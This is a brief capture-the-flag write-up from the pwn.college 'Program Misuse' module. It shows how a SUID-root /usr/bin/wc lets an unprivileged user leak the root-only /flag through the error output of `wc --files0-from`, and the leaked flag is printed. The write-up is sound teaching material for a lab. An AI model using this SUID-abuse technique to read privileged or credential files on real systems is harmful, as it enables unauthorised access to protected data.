---
layout: page
title: "Challenge Name: wc"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Beginner  
**Date**: 2025-07-16  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/wc`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/wc
```

Output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/wc
```

- The `s` in `-rws` indicates it's a SUID binary.
- `wc` runs with **root privileges**.

## 🚀 Exploitation

The `wc` just count number of characters from a file , but heres a exploit to reveal the flag: 

```bash
wc --files0-from /flag
```

Output:
```
wc: 'pwn.college{0u-obrUsJXcx8pEqEs56crHU0JI.dlDOxwSM0IzMyEzW}'$'\n': No such file or directory
```
